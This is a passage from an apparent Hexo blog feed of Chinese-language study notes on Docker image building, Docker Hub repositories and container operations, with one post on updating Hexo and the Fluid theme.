类的行尾添加 <code>\</code> 的命令换行方式，以及行首 <code>#</code> 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。</p><p>此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 <code>apt</code> 缓存文件。这是很重要的一步，我们之前说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。很多人初学 Docker 制作出了很臃肿的镜像的原因之一，就是忘记了每一层构建的最后一定要清理掉无关文件。</p></blockquote><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>好了，让我们再回到之前定制的 nginx 镜像的 Dockerfile 来。现在我们明白了这个 Dockerfile 的内容，那么让我们来构建这个镜像吧。</p><p>在 <code>Dockerfile</code> 文件所在目录执行：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; mynginx docker build -t nginx:v3 .Sending build context to Docker daemon  2.048kBStep 1&#x2F;2 : FROM nginx ---&gt; f6d0b4767a6cStep 2&#x2F;2 : RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html ---&gt; Running in 62f21e170b84Removing intermediate container 62f21e170b84 ---&gt; f68789f1ef01Successfully built f68789f1ef01Successfully tagged nginx:v3</code></pre></div><p>从命令的输出结果中，我们可以清晰的看到镜像的构建过程。在 <code>Step 2</code> 中，如同我们之前所说的那样，<code>RUN</code> 指令启动了一个容器 <code>62f21e170b84</code>，执行了所要求的命令，并最后提交了这一层 <code>f68789f1ef01</code>，随后删除了所用到的这个容器 62f21e170b84。</p><p>这里我们使用了 <code>docker build</code> 命令进行镜像构建。其格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker build [选项] &lt;上下文路径&#x2F;URL&#x2F;-&gt;</code></pre></div><p>在这里我们指定了最终镜像的名称 <code>-t nginx:v3</code>，构建成功后，我们可以像之前运行 <code>nginx:v2</code> 那样来运行这个镜像，其结果会和 <code>nginx:v2</code> 一样。</p><h3 id="镜像构建上下文（Context）"><a href="#镜像构建上下文（Context）" class="headerlink" title="*镜像构建上下文（Context）"></a>*镜像构建上下文（Context）</h3><blockquote><p>简而言之，镜像构建时是将上下文路径下的内容打包至Docker服务器端，构建Docker内容所需文件应在这个上下文路径当中以便引入，且使用相对路径引入。构建过程中的上下文，相当于已经被打包发过去了，跟本地路径已经没关系了。</p><p><strong>所以在指定上下文路径过程时（即<code>docker build</code>命令下）使用什么路径都可以，为的是说明清楚上下文路径的位置。而在Dockerfile中如使用<code>COPY</code>类命令引入文件等操作，源路径应使用关于上下文路径的相对目录。</strong></p><p>其余详细原因见如下描述。</p></blockquote><p>如果注意，会看到 <code>docker build</code> 命令最后有一个 <code>.</code>。<code>.</code> 表示当前目录，而 <code>Dockerfile</code> 就在当前目录，因此不少初学者以为这个路径是在指定 <code>Dockerfile</code> 所在路径，这么理解其实是不准确的。如果对应上面的命令格式，你可能会发现，这是在指定 <strong>上下文路径</strong>。那么什么是上下文呢？</p><p>首先我们要理解 <code>docker build</code> 的工作原理。Docker 在运行时分为 Docker 引擎（也就是服务端守护进程）和客户端工具。Docker 的引擎提供了一组 REST API，被称为 <a href="https://docs.docker.com/develop/sdk/">Docker Remote API</a>，而如 <code>docker</code> 命令这样的客户端工具，则是通过这组 API 与 Docker 引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种 <code>docker</code> 功能，但实际上，一切都是使用的远程调用形式在服务端（Docker 引擎）完成。也因为这种 C/S 设计，让我们操作远程服务器的 Docker 引擎变得轻而易举。</p><p>当我们进行镜像构建的时候，并非所有定制都会通过 <code>RUN</code> 指令完成，经常会需要将一些本地文件复制进镜像，比如通过 <code>COPY</code> 指令、<code>ADD</code> 指令等。而 <code>docker build</code> 命令构建镜像，其实并非在本地构建，而是在服务端，也就是 Docker 引擎中构建的。那么在这种客户端/服务端的架构中，如何才能让服务端获得本地文件呢？</p><p>这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，<code>docker build</code> 命令得知这个路径后，会将路径下的所有内容打包，然后上传给 Docker 引擎。这样 Docker 引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。</p><p>如果在 <code>Dockerfile</code> 中这么写：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY .&#x2F;package.json &#x2F;app&#x2F;</code></pre></div><p>这并不是要复制执行 <code>docker build</code> 命令所在的目录下的 <code>package.json</code>，也不是复制 <code>Dockerfile</code> 所在目录下的 <code>package.json</code>，而是复制 <strong>上下文（context）</strong> 目录下的 <code>package.json</code>。</p><p>因此，<code>COPY</code> 这类指令中的源文件的路径都是<em>相对路径</em>。这也是初学者经常会问的为什么 <code>COPY ../package.json /app</code> 或者 <code>COPY /opt/xxxx /app</code> 无法工作的原因，因为这些路径已经超出了上下文的范围，Docker 引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。</p><p>现在就可以理解刚才的命令 <code>docker build -t nginx:v3 .</code> 中的这个 <code>.</code>，实际上是在指定上下文的目录，<code>docker build</code> 命令会将该目录下的内容打包交给 Docker 引擎以帮助构建镜像。</p><p>如果观察 <code>docker build</code> 输出，我们其实已经看到了这个发送上下文的过程：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker build -t nginx:v3 .Sending build context to Docker daemon 2.048 kB...</code></pre></div><p>理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现 <code>COPY /opt/xxxx /app</code> 不工作后，于是干脆将 <code>Dockerfile</code> 放到了硬盘根目录去构建，结果发现 <code>docker build</code> 执行后，在发送一个几十 GB 的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让 <code>docker build</code> 打包整个硬盘，这显然是使用错误。</p><p>一般来说，应该会将 <code>Dockerfile</code> 置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给 Docker 引擎，那么可以用 <code>.gitignore</code> 一样的语法写一个 <code>.dockerignore</code>，该文件是用于剔除不需要作为上下文传递给 Docker 引擎的。</p><p>那么为什么会有人误以为 <code>.</code> 是指定 <code>Dockerfile</code> 所在目录呢？这是因为在默认情况下，如果不额外指定 <code>Dockerfile</code> 的话，会将上下文目录下的名为 <code>Dockerfile</code> 的文件作为 Dockerfile。</p><p>这只是默认行为，实际上 <code>Dockerfile</code> 的文件名并不要求必须为 <code>Dockerfile</code>，而且并不要求必须位于上下文目录中，比如可以用 <code>-f ../Dockerfile.php</code> 参数指定某个文件作为 <code>Dockerfile</code>。</p><p>当然，一般大家习惯性的会使用默认的文件名 <code>Dockerfile</code>，以及会将其置于镜像构建上下文目录中。</p><h2 id="其它-docker-build-的用法"><a href="#其它-docker-build-的用法" class="headerlink" title="其它 docker build 的用法"></a>其它 <code>docker build</code> 的用法</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 这行命令指定了构建所需的 Git repo，并且指定分支为 master，构建目录为 &#x2F;amd64&#x2F;hello-world&#x2F;# 然后 Docker 就会自己去 git clone 这个项目、切换到指定分支、并进入到指定目录后开始构建。&gt; docker build -t hello-world https:&#x2F;&#x2F;github.com&#x2F;docker-library&#x2F;hello-world.git#master:amd64&#x2F;hello-world# 如果所给出的 URL 不是个 Git repo，而是个 tar 压缩包# 那么 Docker 引擎会下载这个包，并自动解压缩，以其作为上下文，开始构建。&gt; docker build http:&#x2F;&#x2F;server&#x2F;context.tar.gz# 如果标准输入传入的是文本文件，则将其视为 &#96;Dockerfile&#96;，并开始构建。&gt; cat Dockerfile | docker build -# 如果发现标准输入的文件格式是 gzip、bzip2 以及 xz 的话# 将会使其为上下文压缩包，直接将其展开，将里面视为上下文，并开始构建。&gt; docker build - &lt; context.tar.gz</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Dockerfile</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——访问仓库</title>
    <link href="/posts/87094ab1/"/>
    <url>/posts/87094ab1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>对于仓库地址 docker.io/ubuntu 来说，docker.io 是注册服务器地址，ubuntu 是仓库名。注册服务器是管理仓库的具体服务器，每个服务器上可以有多个仓库，而每个仓库下面有多个镜像。</p></blockquote><h3 id="Docker-Hub"><a href="#Docker-Hub" class="headerlink" title="Docker Hub"></a>Docker Hub</h3><p><a href="https://hub.docker.com/">Docker Hub</a>是Docker官方维护的一个公共仓库。其中已经包括了数量超过 <a href="https://hub.docker.com/search/?type=image">2,650,000</a> 的镜像。大部分需求都可以通过在 Docker Hub 中直接下载镜像来实现。免费<a href="https://hub.docker.com/">注册</a>后可登陆使用。</p><p>可以通过执行 <code>docker login</code> 命令交互式的输入用户名及密码来完成在命令行界面登录 Docker Hub。你可以通过 <code>docker logout</code> 退出登录。</p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>你可以通过 <code>docker search</code> 命令来查找官方仓库中的镜像，并利用 <code>docker pull</code> 命令来将它下载到本地。</p><p>例如以 <code>centos</code> 为关键词进行搜索：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker search centosNAME                               DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDcentos                             The official build of CentOS.                   6476      [OK]ansible&#x2F;centos7-ansible            Ansible on Centos7                              133                  [OK]consol&#x2F;centos-xfce-vnc             Centos container with &quot;headless&quot; VNC session…   127                  [OK]···</code></pre></div><p>可以看到返回了很多包含关键字的镜像，其中包括镜像名字、描述、收藏数、是否官方创建（<code>OFFICIAL</code>）、是否自动构建 （<code>AUTOMATED</code>）。</p><p>根据是否是官方提供，可将镜像分为两类。</p><p>一种是类似 <code>centos</code> 这样的镜像，被称为基础镜像或根镜像。这些基础镜像由 Docker 公司创建、验证、支持、提供。这样的镜像往往使用单个单词作为名字。还有一种类型，比如 <code>ansible/centos7-ansible</code> 镜像，它是由 Docker Hub 的注册用户创建并维护的，往往带有用户名称前缀。可以通过前缀 <code>username/</code> 来指定使用某个用户提供的镜像，比如 ansible 用户。</p><p>另外，在查找的时候通过 <code>--filter=stars=N</code> 参数可以指定仅显示收藏数量为 <code>N</code> 以上的镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker search --filter&#x3D;stars&#x3D;100 centosNAME                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDcentos                    The official build of CentOS.                   6476      [OK]ansible&#x2F;centos7-ansible   Ansible on Centos7                              133                  [OK]···</code></pre></div><p>下载官方 <code>centos</code> 镜像到本地。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker pull centosUsing default tag: latestlatest: Pulling from library&#x2F;centos7a0437f04f83: Pull completeDigest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1Status: Downloaded newer image for centos:latestdocker.io&#x2F;library&#x2F;centos:latest</code></pre></div><h3 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h3><p>用户也可以在登录后通过 <code>docker push</code> 命令来将自己的镜像推送到 Docker Hub。</p><p>以下命令中的 <code>username</code> 请替换为你的 Docker 账号用户名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker image lsREPOSITORY    TAG       IMAGE ID       CREATED        SIZEubuntu        18.04     2c047404e52d   3 months ago   63.3MB&gt; docker tag ubuntu:18.04 leex0&#x2F;ubuntu:18.04&gt; docker image lsREPOSITORY     TAG       IMAGE ID       CREATED        SIZEleex0&#x2F;ubuntu   18.04     2c047404e52d   3 months ago   63.3MBubuntu         18.04     2c047404e52d   3 months ago   63.3MB&gt; docker push leex0&#x2F;ubuntu:18.04The push refers to repository [docker.io&#x2F;leex0&#x2F;ubuntu]fe6d8881187d: Mounted from library&#x2F;ubuntu23135df75b44: Mounted from library&#x2F;ubuntub43408d5f11b: Mounted from library&#x2F;ubuntu18.04: digest: sha256:a7fa45fb43d471f4e66c5b53b1b9b0e02f7f1d37a889a41bbe1601fac70cb54e size: 943&gt; docker search leex0NAME                      DESCRIPTION   STARS     OFFICIAL   AUTOMATEDleex0&#x2F;docker101tutorial                 0</code></pre></div><h3 id="私有仓库"><a href="#私有仓库" class="headerlink" title="*私有仓库"></a>*私有仓库</h3><p>创建私有仓库相关可参考<a href="https://yeasy.gitbook.io/docker_practice/repository/registry">链接</a>。</p><hr><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Repository</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客与Fluid主题更新</title>
    <link href="/posts/76079a7b/"/>
    <url>/posts/76079a7b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>博客较旧未更新，记录一下更新过程。</p><p>同时更改一下目前的代码高亮相关配置。</p><p><strong>注：操作前建议将博客内容自行备份。</strong></p><p><strong>所有操作建议都在博客目录下进行。</strong></p></blockquote><h2 id="更新npm"><a href="#更新npm" class="headerlink" title="更新npm"></a>更新npm</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; sudo npm install -g npm&gt; npm -v6.14.11</code></pre></div><p>期间遇到错误：</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">reason: Hostname&#x2F;IP does not match certificate&#39;s altnames: Host: registry.cnpmjs.org. is not in the cert&#39;s altnames: DNS:r.cnpmjs.org</code></pre></div><p>执行<code>npm config set registry http://registry.npmjs.org</code>重新配置npm的registry即可。</p><h2 id="更新node"><a href="#更新node" class="headerlink" title="更新node"></a>更新node</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; sudo npm install -g n&gt; sudo n stablenode -vv14.16.0</code></pre></div><h2 id="更新Hexo"><a href="#更新Hexo" class="headerlink" title="更新Hexo"></a>更新Hexo</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 以下指令均在Hexo目录下操作，先定位到Hexo目录# 查看当前版本，判断是否需要升级&gt; hexo version# 全局升级hexo-cli&gt; npm i hexo-cli -g# 再次查看版本，看hexo-cli是否升级成功&gt; hexo version# 安装npm-check，若已安装可以跳过&gt; npm install -g npm-check# 检查系统插件是否需要升级&gt; npm-check# 安装npm-upgrade，若已安装可以跳过&gt; npm install -g npm-upgrade# 更新package.json&gt; npm-upgrade# 更新全局插件&gt; npm update -g# 更新系统插件&gt; npm update --save# 再次查看版本，判断是否升级成功&gt; hexo versionINFO  Validating confighexo: 5.4.0hexo-cli: 4.2.0os: Darwin 20.3.0 darwin x64node: 14.16.0v8: 8.4.371.19-node.18uv: 1.40.0zlib: 1.2.11brotli: 1.0.9ares: 1.16.1modules: 83nghttp2: 1.41.0napi: 7llhttp: 2.1.3openssl: 1.1.1jcldr: 37.0icu: 67.1tz: 2020aunicode: 13.0</code></pre></div><h2 id="更新Fluid主题"><a href="#更新Fluid主题" class="headerlink" title="更新Fluid主题"></a>更新Fluid主题</h2><blockquote><p>根据<a href="https://github.com/fluid-dev/hexo-theme-fluid">主题介绍</a>，较为简单的方式为使用npm安装也易于维护。</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install --save hexo-theme-fluidnpm update --save hexo-theme-fluid</code></pre></div><h3 id="主题配置说明"><a href="#主题配置说明" class="headerlink" title="主题配置说明"></a>主题配置说明</h3><p>若之前采用解压方式使用主题，主题文件将会在<code>/blog/themes/fluid</code>下存储。</p><p>采用npm安装后，主题文件存放于<code>/blog/node_modules/hexo-theme-fluid</code>。</p><p><strong>采用npm安装后注意将之前存放的静态文件与配置同步到新存放位置。</strong></p><p>同时将两者配置文件进行同步，因为新版本中字段使用可能与老版本不同，直接覆盖配置文件可能导致无法使用。</p><p>Hexo 5.0.0 版本以上的用户，在博客目录下创建 <code>/blog/_config.fluid.yml</code> 文件，将主题的<code>/blog/node_modules/hexo-theme-fluid/_config.yml</code>内容复制过去。</p><p>以后如果修改任何主题配置，都只需修改 <code>_config.fluid.yml</code> 的配置即可。</p><h3 id="代码高亮显示"><a href="#代码高亮显示" class="headerlink" title="代码高亮显示"></a>代码高亮显示</h3><p>之前的高亮显示不明显，修改一下高亮显示配置。</p><p>在之前的配置文件中<code>/blog/_config.yml</code>，高亮为如下配置：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:  enable: true  auto_detect: false  line_number: true  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: false  preprocess: true  line_number: true  tab_replace: &#39;&#39;</code></pre></div><p>现选择<code>prismjs</code>为高亮配置：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:  enable: false  auto_detect: false  line_number: true  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: true  preprocess: true  line_number: true  tab_replace: &#39;&#39;</code></pre></div><p>同时在<code>/blog/_config.fluid.yml</code>中将<code>lib: &quot;highlightjs&quot;</code>：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:    enable: true    line_number: true    # Highlight library    # Options: highlightjs | prismjs    lib: &quot;highlightjs&quot;        highlightjs:      style: &quot;Github Gist&quot;      bg_color: false    prismjs:      style: &quot;default&quot;      preprocess: false</code></pre></div><p>修改为<code>lib: &quot;prismjs&quot;</code>：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:    enable: true    line_number: true    # Highlight library    # Options: highlightjs | prismjs    lib: &quot;prismjs&quot;        highlightjs:      style: &quot;Github Gist&quot;      bg_color: false    prismjs:      style: &quot;default&quot;      preprocess: false</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://hexo.io/zh-cn/docs/syntax-highlight.html">https://hexo.io/zh-cn/docs/syntax-highlight.html</a></p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p><a href="https://www.imczw.com/post/tech/hexo5-next8-updated.html">https://www.imczw.com/post/tech/hexo5-next8-updated.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——操作容器</title>
    <link href="/posts/e4b4fa4b/"/>
    <url>/posts/e4b4fa4b/</url>
    
    <content type="html"><![CDATA[<h2 id="1-启动"><a href="#1-启动" class="headerlink" title="1. 启动"></a>1. 启动</h2><h3 id="新建并启动"><a href="#新建并启动" class="headerlink" title="新建并启动"></a>新建并启动</h3><p>所需要的命令主要为 <code>docker run</code>。</p><p>例如，下面的命令输出一个 “Hello World”，之后终止容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run ubuntu:18.04 &#x2F;bin&#x2F;echo &#39;Hello world&#39;Hello world</code></pre></div><p>这跟在本地直接执行 <code>/bin/echo &#39;hello world&#39;</code> 几乎感觉不出任何区别。</p><p>下面的命令则启动一个 bash 终端，允许用户进行交互。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -t -i ubuntu:18.04 &#x2F;bin&#x2F;bashroot@af8bae53bdd3:&#x2F;#</code></pre></div><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><p>在交互模式下，用户可以通过所创建的终端来输入命令，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@74e4ce548f2e:&#x2F;# pwd&#x2F;root@74e4ce548f2e:&#x2F;# lsbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  varroot@74e4ce548f2e:&#x2F;#</code></pre></div><p>当利用 <code>docker run</code> 来创建容器时，Docker 在后台运行的标准操作包括：</p><ul><li>检查本地是否存在指定的镜像，不存在就从 <a href>registry</a> 下载</li><li>利用镜像创建并启动一个容器</li><li>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层</li><li>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去</li><li>从地址池配置一个 ip 地址给容器</li><li>执行用户指定的应用程序</li><li>执行完毕后容器被终止</li></ul><h3 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h3><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止（<code>exited</code>）的容器启动运行。</p><p>容器的核心为所执行的应用程序，所需要的资源都是应用程序运行所必需的。除此之外，并没有其它的资源。可以在伪终端中利用 <code>ps</code> 或 <code>top</code> 来查看进程信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@ba267838cc1b:&#x2F;# ps  PID TTY          TIME CMD    1 ?        00:00:00 bash   11 ?        00:00:00 ps</code></pre></div><p>可见，容器中仅运行了指定的 bash 应用。这种特点使得 Docker 对资源的利用率极高，是货真价实的轻量级虚拟化。</p><h2 id="2-守护态运行"><a href="#2-守护态运行" class="headerlink" title="2. 守护态运行"></a>2. 守护态运行</h2><p>更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 <code>-d</code> 参数来实现。</p><p>下面举两个例子来说明一下。</p><p>如果不使用 <code>-d</code> 参数运行容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run ubuntu:18.04 &#x2F;bin&#x2F;sh -c &quot;while true; do echo hello world; sleep 1; done&quot;hello worldhello worldhello worldhello world</code></pre></div><p>容器会把输出的结果 (STDOUT) 打印到宿主机上面</p><p>如果使用了 <code>-d</code> 参数运行容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -d ubuntu:18.04 &#x2F;bin&#x2F;sh -c &quot;while true; do echo hello world; sleep 1; done&quot;439564c20b1720238739ce01c54e7d6dcda6284a3a8f8994c9d28097cad72790</code></pre></div><p>此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><blockquote><p><strong>注：</strong> 容器是否会长久运行，是和 <code>docker run</code> 指定的命令有关，和 <code>-d</code> 参数无关。</p></blockquote><p>使用 <code>-d</code> 参数启动后会返回一个唯一的 id，也可以通过 <code>docker container ls</code> 命令来查看容器信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container lsCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS     NAMES439564c20b17   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   6 minutes ago   Up 6 minutes             ecstatic_antonelli</code></pre></div><p>要获取容器的输出信息，可以通过 <code>docker container logs</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container logs [container ID or NAMES]hello worldhello worldhello world. . .</code></pre></div><h2 id="3-终止"><a href="#3-终止" class="headerlink" title="3. 终止"></a>3. 终止</h2><p>可以使用 <code>docker container stop</code> 来终止一个运行中的容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container stop 439439</code></pre></div><p>此外，当 Docker 容器中指定的应用终结时，容器也自动终止。</p><p>例如对于上一章节中只启动了一个终端的容器，用户通过 <code>exit</code> 命令或 <code>Ctrl+d</code> 来退出终端时，所创建的容器立刻终止。</p><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到。例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container ls -aCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS                        PORTS     NAMES439564c20b17   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   9 minutes ago    Exited (137) 38 seconds ago             ecstatic_antonelli98f27ac5ddc4   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   9 minutes ago    Exited (0) 9 minutes ago                unruffled_shirley74e4ce548f2e   ubuntu:18.04   &quot;&#x2F;bin&#x2F;bash&quot;              16 minutes ago   Exited (0) 15 minutes ago               ecstatic_jemison5cc8c294fe40   ubuntu:18.04   &quot;&#x2F;bin&#x2F;echo &#39;Hello wo…&quot;   17 minutes ago   Exited (0) 17 minutes ago               vibrant_buck</code></pre></div><p>处于终止状态的容器，可以通过 <code>docker container start</code> 命令来重新启动。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container start 439439</code></pre></div><p>此外，<code>docker container restart</code> 命令会将一个运行态的容器终止，然后再重新启动它。</p><h2 id="4-进入容器"><a href="#4-进入容器" class="headerlink" title="4. 进入容器"></a>4. 进入容器</h2><p>在使用 <code>-d</code> 参数时，容器启动后会进入后台。</p><p>某些时候需要进入容器进行操作，包括使用 <code>docker attach</code> 命令或 <code>docker exec</code> 命令，推荐大家使用 <code>docker exec</code> 命令，原因会在下面说明。</p><h3 id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h3><p>下面示例如何使用 <code>docker attach</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -dit ubuntuf780a070123a203ab14b1632c9fe51850568baa8ae906e1fc006f21b1b763cde$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMESf780a070123a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   7 seconds ago   Up 6 seconds             interesting_almeida$ docker attach f780root@f780a070123a:&#x2F;# pwd&#x2F;root@f780a070123a:&#x2F;#</code></pre></div><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h3 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h3><p><code>-i</code> <code>-t</code> 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -dit ubuntubf85753fd26a3af4ee9a600dd41010e5f6f6ea2a7eb059dd017010d7f47f99b7$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMESbf85753fd26a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   7 seconds ago   Up 7 seconds             loving_tharp$ docker exec -i bf857 bashlsbinboot...$ docker exec -it bf857 bashroot@bf85753fd26a:&#x2F;# pwd&#x2F;root@bf85753fd26a:&#x2F;#</code></pre></div><p>如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 <code>docker exec</code> 的原因。</p><p>更多参数说明请使用 <code>docker exec --help</code> 查看。</p><h2 id="5-导出和导入"><a href="#5-导出和导入" class="headerlink" title="5. 导出和导入"></a>5. 导出和导入</h2><h3 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container ls -aCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS                       PORTS     NAMESbf85753fd26a   ubuntu         &quot;&#x2F;bin&#x2F;bash&quot;              5 minutes ago    Up 5 minutes                           loving_tharpf780a070123a   ubuntu         &quot;&#x2F;bin&#x2F;bash&quot;              7 minutes ago    Exited (0) 6 minutes ago               interesting_almeida$ docker export bf8 &gt; ubuntu.tar</code></pre></div><p>这样将导出容器快照到本地文件。</p><h3 id="导入容器快照"><a href="#导入容器快照" class="headerlink" title="导入容器快照"></a>导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker import ubuntu.tar test&#x2F;ubuntu:v1.0sha256:a2096fd67aaa28187fda28a9c3c6a1f9184a13c589f0f5d9eb11dd554cb8d6e5$ docker image lsREPOSITORY    TAG       IMAGE ID       CREATED          SIZEtest&#x2F;ubuntu   v1.0      a2096fd67aaa   10 seconds ago   72.9MBhello-world   latest    d1165f221234   2 weeks ago      13.3kBubuntu        latest    f643c72bc252   3 months ago     72.9MBubuntu        18.04     